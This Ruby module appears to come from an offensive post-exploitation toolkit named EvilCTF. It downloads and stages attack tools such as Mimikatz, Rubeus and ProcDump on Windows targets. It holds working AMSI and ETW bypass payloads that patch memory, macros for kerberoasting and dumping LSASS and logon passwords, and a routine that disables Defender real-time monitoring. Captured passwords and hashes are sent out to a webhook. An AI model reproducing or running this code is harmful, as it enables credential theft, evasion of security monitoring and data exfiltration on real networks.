require 'fileutils'
require 'zip'
require 'uri'
require 'net/http'
require 'json'
require 'base64'
require 'digest/sha1'
require 'readline'
require 'shellwords'

module EvilCTF::Tools
  TOOL_REGISTRY = {
    sharphound: { 
      name: "SharpHound (BloodHound Collector)", 
      filename: "SharpHound.exe",
      description: "BloodHound AD collector",
      category: "reconnaissance",
      download_url: "https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe",
      backup_urls: [
        "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe"
      ],
      recommended_remote: "C:\\Users\\Public\\SharpHound.exe"
    },
    rubeus: {
      name: "Rubeus", 
      filename: "Rubeus.exe",
      description: "Kerberos ticket manipulation tool",
      category: "credential_tools",
      download_url: "https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/Rubeus.exe",
      backup_urls: [],
      recommended_remote: "C:\\Users\\Public\\Rubeus.exe"
    },
    powerview: {
      name: "PowerView", 
      filename: "PowerView.ps1",
      description: "Active Directory enumeration toolkit",
      category: "reconnaissance",
      download_url: "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1",
      backup_urls: [],
      recommended_remote: "C:\\Users\\Public\\PowerView.ps1"
    },
    mimikatz: { 
      name: "Mimikatz", 
      filename: "mimikatz.exe",
      description: "Extract credentials from memory",
      category: "credential_tools",
      download_url: "https://github.com/jakobfriedl/precompiled-binaries/raw/main/Credentials/mimikatz.exe",
      backup_urls: [],
      recommended_remote: "C:\\Users\\Public\\mimikatz.exe"
    },
    winpeas: {
      name: "WinPEAS", 
      filename: "winPEASx64.exe",
      description: "Windows local enumeration tool",
      category: "enumeration",
      download_url: "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe",
      backup_urls: [],
      recommended_remote: "C:\\Users\\Public\\winPEASx64.exe"
    },
    seatbelt: {
      name: "Seatbelt", 
      filename: "Seatbelt.exe",
      description: "Windows post-exploitation tool",
      category: "enumeration",
      download_url: "https://github.com/jakobfriedl/precompiled-binaries/raw/main/Enumeration/Seatbelt.exe",
      backup_urls: [],
      recommended_remote: "C:\\Users\\Public\\Seatbelt.exe"
    },
    inveigh: {
      name: "Inveigh", 
      filename: "Inveigh.ps1",
      description: "Windows SMB relay and HTTP proxy tool",
      category: "reconnaissance",
      download_url: "https://github.com/jakobfriedl/precompiled-binaries/raw/main/Scripts/Inveigh.ps1",
      backup_urls: [],
      recommended_remote: "C:\\Users\\Public\\Inveigh.ps1"
    },
    procdump: {
      name: "ProcDump", 
      filename: "procdump64.exe",
      description: "Sysinternals process dumper for LSASS extraction",
      category: "memory_tools",
      download_url: "https://download.sysinternals.com/files/Procdump.zip",
      backup_urls: [],
      recommended_remote: "C:\\Users\\Public\\procdump64.exe"
    },
    nishang: {
      name: "Nishang", 
      filename: "nishang.zip",
      description: "PowerShell attack framework",
      category: "reconnaissance",
      download_url: "https://github.com/samratashok/nishang/archive/refs/tags/v0.7.6.zip",
      backup_urls: [],
      recommended_remote: "C:\\Users\\Public\\nishang.zip"
    },
    plink: {
      name: "Plink", 
      filename: "plink.exe",
      description: "SSH client for tunneling",
      category: "tunneling",
      download_url: "https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe",
      backup_urls: [],
      recommended_remote: "C:\\Users\\Public\\plink.exe"
    }
  }.freeze

  # AMSI bypass script
  BYPASS_4MSI_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
    $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
    $oldProtect = 0
    [kernel32]::VirtualProtect($scanBuffer, [uint32]5, 0x40, [ref]$oldProtect) | Out-Null
    $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 6)
    "[+] AMSI bypassed (AmsiScanBuffer patched)"
    try { IEX ("Am"+"siU"+"tils") } catch { "[+] Bypass confirmed" }
  PS

  # ETW bypass script
  ETW_BYPASS_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
    $funcs = @("EtwEventWrite","EtwEventWriteTransfer","EtwEventWriteFull","EtwEventWriteEx")
    $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3)
    foreach ($f in $funcs) {
      $addr = [kernel32]::GetProcAddress($ntdll, $f)
      if ($addr -ne 0) {
        $old = 0
        [kernel32]::VirtualProtect($addr, 4, 0x40, [ref]$old) | Out-Null
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 4)
      }
    }
    try {
      $type = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
      $field = $type.GetField('etwProvider','NonPublic,Static')
      $field.SetValue($null, [Activator]::CreateInstance("System.Diagnostics.Eventing.EventProvider", [Guid]::NewGuid()))
    } catch {}
    "[+] Full ETW bypass completed"
  PS

  class CommandManager
    def initialize
      @aliases = { 'ls'=>'Get-ChildItem', 'whoami'=>'$env:USERNAME', 'pwd'=>'Get-Location', 'ps'=>'Get-Process' }
      @macros = {
        'kerberoast'     => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
        'dump_creds'     => [BYPASS_4MSI_PS, "& \"C:\\Users\\Public\\mimikatz.exe\" \"privilege::debug\" \"log C:\\Users\\Public\\mimikatz.log\" \"sekurlsa::logonpasswords\" 2>$null; exit"],
        'lsass_dump'     => [BYPASS_4MSI_PS, "& \"C:\\Users\\Public\\procdump64.exe\" -accepteula -ma lsass C:\\Users\\Public\\lsass.dmp", "Remove-Item \"C:\\Users\\Public\\procdump64.exe\""]
      }
    end

    def expand_alias(cmd)
      @aliases.each do |k, v|
        return cmd.sub(k, v) if cmd.start_with?(k)
      end
      cmd
    end

    def expand_macro(name, shell, webhook: nil)
      macro = @macros[name.downcase]
      return false unless macro

      puts "[*] Expanding macro: #{name}"
      macro.each do |step|
        result = shell.run(step)
        puts result.output.strip
        matches = EvilCTF::Tools.grep_output(result.output)
        if matches.any?
          EvilCTF::Tools.save_loot(matches)
          EvilCTF::Tools.beacon_loot(webhook, matches) if webhook
        end
      end
      true
    end

    def list_macros; @macros.keys.sort end
    def list_aliases; @aliases.keys.sort end
  end

  # Helper functions for tool handling
  def self.download_tool(key)
    tool = TOOL_REGISTRY[key]
    return nil unless tool && (tool[:download_url] || tool[:backup_urls])

    FileUtils.mkdir_p('tools')
    path = File.join('tools', tool[:filename])
    return path if File.exist?(path)

    all_urls = [tool[:download_url]] + (tool[:backup_urls] || [])
    all_urls.compact!
    success = false

    all_urls.each do |url|
      next unless url
      puts "[*] Trying #{url}..."
      success = download_from_url(url, path)
      break if success
    end

    success ? path : nil
  rescue => e
    puts "[!] Download failed for #{key}: #{e.message}"
    nil
  end

  def self.download_from_url(url, path)
    success = false

    curl_cmd = "curl -L --fail -o #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
    success = system("#{curl_cmd} > /dev/null 2>&1") if success == false
    unless success
      wget_cmd = "wget -O #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
      success = system("#{wget_cmd} > /dev/null 2>&1")
    end

    unless success
      begin
        URI.open(url) do |f|
          File.binwrite(path, f.read)
        end
        success = true
      rescue => e
        puts "[!] Ruby open-uri download failed: #{e.message}"
      end
    end

    unless success
      ps_cmd = "powershell -Command \"try { Invoke-WebRequest -Uri '#{url}' -OutFile '#{path}' -UseBasicParsing } catch { exit 1 }\""
      success = system(ps_cmd)
    end

    success
  end

  def self.download_missing_tools; TOOL_REGISTRY.each_key { |k| download_tool(k) }; end

  # Auto staging logic (simplified from original)
  def self.safe_autostage(tool_key, shell, options, logger)
    tool = TOOL_REGISTRY[tool_key]
    return false unless tool
    remote_path = tool[:recommended_remote]
    check_cmd = "if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }"
    result = shell.run(check_cmd)
    return true if result.output.include?('EXISTS')

    arch = get_system_architecture(shell)
    adjusted_tool = tool.dup

    # Handle architecture-specific tools
    if tool_key == 'procdump'
      if arch == 'x64'
        adjusted_tool[:filename] = 'procdump64.exe'
        adjusted_tool[:download_url] = 'https://live.sysinternals.com/tools/procdump64.exe'
        adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump64.exe'
      else
        adjusted_tool[:filename] = 'procdump.exe'
        adjusted_tool[:download_url] = 'https://live.sysinternals.com/tools/procdump.exe'
        adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump.exe'
      end
    elsif tool_key == 'mimikatz' && tool[:zip]
      # For mimikatz, we need to download the .7z and extract it properly
      # This is a simplified version - you may want to add proper extraction logic
      adjusted_tool[:filename] = 'mimikatz.exe'
    end

    local_path = find_tool_on_disk(tool_key)
    unless local_path && File.exist?(local_path)
      puts "[!] Local tool not found: #{adjusted_tool[:filename]}"
      local_path = download_tool(tool_key)
      return false unless local_path && File.exist?(local_path)
    end

    puts "[*] Staging #{adjusted_tool[:name]} to #{adjusted_tool[:recommended_remote]}"
    verify_result = EvilCTF::Uploader.upload_file(local_path, adjusted_tool[:recommended_remote], shell)
    
    if verify_result
      puts "[+] Successfully staged #{adjusted_tool[:name]}"
      return true
    else
      puts "[!] Upload verification failed for #{adjusted_tool[:name]}"
      return false
    end
  rescue => e
    puts "[!] Auto staging failed: #{e.message}"
    false
  end

  def self.list_available_tools
    puts "\n AVAILABLE TOOLS ".ljust(70, '=')
    TOOL_REGISTRY.group_by { |_, v| v[:category] }.each do |cat, tools|
      puts "\n #{cat.upcase}:"
      tools.each do |key, t|
        local_status = File.exist?(File.join('tools', t[:filename])) ? '📁' : '❌'
        puts " [#{local_status}] #{t[:name]} (#{key}) - #{t[:description]}"
      end
    end
    puts "\nCommands:"
    puts "  tools                   - List available tools"
    puts "  download_missing        - Download all missing tools into ./tools"
    puts "  tool <name>             - Stage and use a specific tool"
    puts "  tool all                - Stage all available tools"
    puts '=' * 70
  end

  def self.disable_defender(shell)
    ps_script = <<~PS
      try {
        Set-MpPreference -DisableRealtimeMonitoring $true -Force
        Add-MpPreference -ExclusionPath "C:\\Users\\Public" -Force
        Add-MpPreference -ExclusionProcess "mimikatz.exe", "procdump64.exe" -Force
        Write-Output "Defender real-time monitoring disabled"
      } catch {
        Write-Output "ERROR: Defender disable failed"
      }
    PS

    result = shell.run(ps_script)
    puts result.output.strip
  end

  # Additional helper methods that were missing
  def self.get_system_architecture(shell)
    arch_result = shell.run('$env:PROCESSOR_ARCHITECTURE')
    arch = arch_result.output.strip.downcase
    case arch
    when 'amd64', 'x86_64'
      'x64'
    else
      'x86'
    end
  rescue => e
    puts "[!] Failed to detect architecture, assuming x64"
    'x64'
  end

  def self.find_tool_on_disk(tool_key)
    tool = TOOL_REGISTRY[tool_key]
    return nil unless tool
    
    local_path = File.join('tools', tool[:filename])
    File.exist?(local_path) ? local_path : nil
  rescue => e
    puts "[!] Error finding tool on disk: #{e.message}"
    nil
  end

  # Helper functions for loot handling (simplified but functional)
  def self.grep_output(output)
    return [] unless output
    
    matches = []
    patterns = [
      /password[:\s]+([^\r\n]+)/i,
      /hash[:\s]+([a-f0-9]{32,})/i,
      /flag\{[^}]+\}/i
    ]
    
    patterns.each do |pattern|
      output.scan(pattern) { |match| matches << match.first }
    end
    
    matches.compact.uniq
  rescue => e
    puts "[!] Error grepping output: #{e.message}"
    []
  end

  def self.save_loot(matches)
    return unless matches.any?
    
    FileUtils.mkdir_p('loot')
    timestamp = Time.now.strftime('%Y%m%d_%H%M%S')
    loot_file = "loot/auto_loot_#{timestamp}.txt"
    
    File.open(loot_file, 'a') do |f|
      matches.each { |match| f.puts "[*] #{Time.now}: #{match}" }
    end
    
    puts "[+] Loot saved to #{loot_file}"
  rescue => e
    puts "[!] Failed to save loot: #{e.message}"
  end

  def self.beacon_loot(webhook, matches)
    return unless webhook && matches.any?
    
    # Basic webhook beacon for loot
    payload = {
      timestamp: Time.now.iso8601,
      loot: matches.join(', '),
      count: matches.length
    }.to_json
    
    begin
      uri = URI.parse(webhook)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = (uri.scheme == 'https')
      
      request = Net::HTTP::Post.new(uri.request_uri)
      request['Content-Type'] = 'application/json'
      request.body = payload
      
      response = http.request(request)
      puts "[+] Beacon sent to #{webhook}: HTTP #{response.code}"
    rescue => e
      puts "[!] Failed to beacon loot: #{e.message}"
    end
  rescue => e
    puts "[!] Webhook error: #{e.message}"
  end

  # Profile management methods
  def self.save_config_profile(name, options)
    profile = {
      name: name,
      options: options.except(:endpoint),
      timestamp: Time.now.iso8601
    }
    
    config_dir = File.join('config', 'profiles')
    FileUtils.mkdir_p(config_dir)
    
    profile_file = File.join(config_dir, "#{name}.yaml")
    require 'yaml'
    File.write(profile_file, YAML.dump(profile))
    
    puts "[+] Profile saved: #{profile_file}"
  rescue => e
    puts "[!] Failed to save profile: #{e.message}"
  end

  def self.load_config_profile(name)
    config_dir = File.join('config', 'profiles')
    profile_file = File.join(config_dir, "#{name}.yaml")
    
    unless File.exist?(profile_file)
      puts "[!] Profile not found: #{profile_file}"
      return {}
    end
    
    require 'yaml'
    profile_data = YAML.load_file(profile_file)
    profile_data[:options] || {}
  rescue => e
    puts "[!] Failed to load profile: #{e.message}"
    {}
  end
end
